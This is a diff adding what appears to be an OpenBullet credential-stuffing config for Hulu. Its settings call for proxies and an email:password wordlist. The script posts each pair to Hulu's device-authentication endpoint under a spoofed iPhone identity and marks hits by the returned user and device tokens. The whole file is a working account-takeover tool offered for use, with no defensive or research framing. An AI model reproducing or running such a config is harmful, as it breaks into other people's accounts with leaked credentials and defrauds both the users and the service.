@@ -1,0 +1,37 @@
+[SETTINGS]
+{
+  "Name": "Hulu",
+  "SuggestedBots": 1,
+  "LastModified": "2018-05-29T11:57:29.1714441+00:00",
+  "AdditionalInfo": "",
+  "Author": "LukaRoyal",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 5,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://auth.hulu.com/v1/device/password/authenticate" AutoRedirect=TRUE 
+  CONTENT "affiliate_name=apple&friendly_name=fuckyou+Iphone&password=<PASS>&product_name=iPhone7%2C2&serial_number=00001e854946e42b1cbf418fe7d2dcd64df0&user_email=<USER>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "Your login is invalid. Please try again" 
+  KEYCHAIN Success AND 
+    KEY "user_token" 
+    KEY "device_token" 
